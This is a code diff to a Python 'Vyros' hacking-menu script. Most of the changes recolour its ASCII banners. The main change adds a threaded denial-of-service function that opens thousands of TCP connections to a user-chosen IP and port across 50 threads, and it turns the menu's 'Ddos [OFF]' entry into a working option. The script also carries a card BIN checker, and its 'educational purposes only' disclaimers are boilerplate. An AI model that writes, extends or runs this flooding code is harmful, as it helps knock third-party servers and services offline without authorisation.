@@ -1,4 +1,6 @@
 # This tool doens't promove any illegal attitude or pentest with no authorization, this tool its for educacional purposes only
+import socket
+import threading
 import os
 import requests
 import random
@@ -12,16 +14,16 @@ colorama.init()
 os.system('clear')
 
 def banner():
-    print(Fore.RED + '    ____   ____                           ')
-    print(Fore.RED + '    \   \ /   /__.__._______  ____  ______')
-    print(Fore.RED + '     \   Y   <   |  |\_  __ \/  _ \/  ___/')
-    print(Fore.RED + '      \     / \___  | |  | \(  <_> )___ \ ')
-    print(Fore.RED + '       \___/  / ____| |__|   \____/____  >')
-    print(Fore.RED + '              \/                       \/ ')
-    print(Fore.MAGENTA + '[*] This tool does not promote web attacks and illegals attitudes')
+    print(Fore.CYAN + '    ____   ____                           ')
+    print(Fore.CYAN + '    \   \ /   /__.__._______  ____  ______')
+    print(Fore.CYAN + '     \   Y   <   |  |\_  __ \/  _ \/  ___/')
+    print(Fore.CYAN + '      \     / \___  | |  | \(  <_> )___ \ ')
+    print(Fore.CYAN + '       \___/  / ____| |__|   \____/____  >')
+    print(Fore.CYAN + '              \/                       \/ ')
+    print(Fore.GREEN + '[*] This tool does not promote web attacks and illegals attitudes')
 
 def banner2():
-    print(Fore.RED + """     ▌ ▐· ▄· ▄▌▄▄▄        .▄▄ · 
+    print(Fore.YELLOW + """     ▌ ▐· ▄· ▄▌▄▄▄        .▄▄ · 
     ▪█·█▌▐█▪██▌▀▄ █·▪     ▐█ ▀. 
     ▐█▐█•▐█▌▐█▪▐▀▀▄  ▄█▀▄ ▄▀▀▀█▄
      ███  ▐█▀·.▐█•█▌▐█▌.▐▌▐█▄▪▐█
@@ -39,35 +41,35 @@ def banner3():
     print(Fore.RED + '         ░░   ▒ ▒ ░░    ░░   ░ ░ ░ ░ ▒  ░  ░  ░  ')
     print(Fore.RED + '          ░   ░ ░        ░         ░ ░        ░  ')
     print(Fore.RED + '         ░    ░ ░                                ')
-    print (Fore.MAGENTA + '[*] This tool does not promote web attacks and illegals attitudes')
+    print (Fore.YELLOW + '[*] This tool does not promote web attacks and illegals attitudes')
 
 def banner4():
-    print(Fore.RED + '    ██╗   ██╗██╗   ██╗██████╗  ██████╗ ███████╗')
-    print(Fore.RED + '    ██║   ██║╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔════╝')
-    print(Fore.RED + '    ██║   ██║ ╚████╔╝ ██████╔╝██║   ██║███████╗')
-    print(Fore.RED + '    ╚██╗ ██╔╝  ╚██╔╝  ██╔══██╗██║   ██║╚════██║')
-    print(Fore.RED + '     ╚████╔╝    ██║   ██║  ██║╚██████╔╝███████║')
-    print(Fore.RED + '      ╚═══╝     ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝')
-    print (Fore.MAGENTA + '[*] This tool does not promote web attacks and illegals attitudes')
+    print(Fore.GREEN + '    ██╗   ██╗██╗   ██╗██████╗  ██████╗ ███████╗')
+    print(Fore.GREEN + '    ██║   ██║╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔════╝')
+    print(Fore.GREEN + '    ██║   ██║ ╚████╔╝ ██████╔╝██║   ██║███████╗')
+    print(Fore.GREEN + '    ╚██╗ ██╔╝  ╚██╔╝  ██╔══██╗██║   ██║╚════██║')
+    print(Fore.GREEN + '     ╚████╔╝    ██║   ██║  ██║╚██████╔╝███████║')
+    print(Fore.GREEN + '      ╚═══╝     ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝')
+    print (Fore.BLUE + '[*] This tool does not promote web attacks and illegals attitudes')
 
 def banner5():
-    print(Fore.RED + '     ▄█    █▄  ▄██   ▄      ▄████████  ▄██████▄     ▄████████ ')
-    print(Fore.RED + '    ███    ███ ███   ██▄   ███    ███ ███    ███   ███    ███ ')
-    print(Fore.RED + '    ███    ███ ███▄▄▄███   ███    ███ ███    ███   ███    █▀  ')
-    print(Fore.RED + '    ███    ███ ▀▀▀▀▀▀███  ▄███▄▄▄▄██▀ ███    ███   ███        ')
-    print(Fore.RED + '    ███    ███ ▄██   ███ ▀▀███▀▀▀▀▀   ███    ███ ▀███████████ ')
-    print(Fore.RED + '    ███    ███ ███   ███ ▀███████████ ███    ███          ███ ')
-    print(Fore.RED + '    ███    ███ ███   ███   ███    ███ ███    ███    ▄█    ███ ')
-    print(Fore.RED + '     ▀██████▀   ▀█████▀    ███    ███  ▀██████▀   ▄████████▀  ')
-    print(Fore.RED + '                           ███    ███                         ')
-    print (Fore.MAGENTA + '[*] This tool does not promote web attacks and illegals attitudes')
+    print(Fore.WHITE + '     ▄█    █▄  ▄██   ▄      ▄████████  ▄██████▄     ▄████████ ')
+    print(Fore.WHITE + '    ███    ███ ███   ██▄   ███    ███ ███    ███   ███    ███ ')
+    print(Fore.WHITE + '    ███    ███ ███▄▄▄███   ███    ███ ███    ███   ███    █▀  ')
+    print(Fore.WHITE + '    ███    ███ ▀▀▀▀▀▀███  ▄███▄▄▄▄██▀ ███    ███   ███        ')
+    print(Fore.WHITE + '    ███    ███ ▄██   ███ ▀▀███▀▀▀▀▀   ███    ███ ▀███████████ ')
+    print(Fore.WHITE + '    ███    ███ ███   ███ ▀███████████ ███    ███          ███ ')
+    print(Fore.WHITE + '    ███    ███ ███   ███   ███    ███ ███    ███    ▄█    ███ ')
+    print(Fore.WHITE + '     ▀██████▀   ▀█████▀    ███    ███  ▀██████▀   ▄████████▀  ')
+    print(Fore.WHITE + '                           ███    ███                         ')
+    print (Fore.RED + '[*] This tool does not promote web attacks and illegals attitudes')
     
 def banner6():
-    print(Fore.RED + '     _____ __ __ _____ _____ _____ ')
-    print(Fore.RED + '    |  |  |  |  | __  |     |   __|')
-    print(Fore.RED + '    |  |  |_   _|    -|  |  |__   |')
-    print(Fore.RED + '     \___/  |_| |__|__|_____|_____|')
-    print (Fore.MAGENTA + '[*] This tool does not promote web attacks and illegals attitudes')
+    print(Fore.BLUE + '     _____ __ __ _____ _____ _____ ')
+    print(Fore.BLUE + '    |  |  |  |  | __  |     |   __|')
+    print(Fore.BLUE + '    |  |  |_   _|    -|  |  |__   |')
+    print(Fore.BLUE + '     \___/  |_| |__|__|_____|_____|')
+    print (Fore.WHITE + '[*] This tool does not promote web attacks and illegals attitudes')
     
 def banner7():
     print(Fore.RED + '         ##### /      ##                                          ')
@@ -122,11 +124,42 @@ def bin_checker(bin_number):
         }
     else:
         return None
+def target():
+    target = input("Enter target IP and port (e.g., 192.168.1.1 80): ")
+    threads = []
+
+    for i in range(50):  # Create 50 threads
+        thread = threading.Thread(target=ddos, args=(target,))
+        thread.start()
+        threads.append(thread)
+
+    for t in threads:
+        t.join()        
+        
+        
+def ddos(target):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)
+
+    try:
+        target_ip = target.split()[0]
+        port = int(target.split()[1])
+
+        print(f"[{threading.current_thread().name }] Connecting to {target_ip}:{port}")
+
+        for _ in range(10000):  # Adjust number of connections
+            try:
+                sock.connect((target_ip, port))
+                sock.close()
+            except Exception as e:
+                print(f"[{threading.current_thread().name}] Error: {e}")
+    except IndexError:
+        print("Invalid target format. Use: IP_ADDRESS PORT")
         
 def bininfo():
     os.system("clear")
     bincheckbanner()
-    bin_number = input("Type Bin (6/8 digits): ")
+    bin_number = input("Type Bin (6 digits): ")
     result = bin_checker(bin_number)
 
     if result:
@@ -270,7 +303,7 @@ def tools():
         print(Fore.RESET + '')
         time.sleep(3)
         os.system('clear')
-        menuescolha()
+        bannerandom()
     elif escolhatool == '10': hammer()
     elif escolhatool == 'exit':
         os.system('clear')
@@ -301,7 +334,7 @@ def main_menu():
     print('         MAIN MENU        ')
     print('1 > Bin check')
     print('2 > Ip lookup')
-    print('3 > Ddos [OFF]')
+    print('3 > Ddos')
     print('4 > Install tools')
     print('■■■■■■■■■■■■■■■■■■■■■■■■■')
     print(Fore.RESET + '')
@@ -363,8 +396,7 @@ def menuescolha():
             ip_address = input(Fore.CYAN + 'Type Ip: ')
             ip_lookup(ip_address)
         elif escolha == '3':
-            # implementar ddos
-            pass
+            target()
         elif escolha == '4':
             print(Fore.CYAN + '      INSTALL TOOLS')
             print('■■■■■■■■■■■■■■■■■■■■■■')
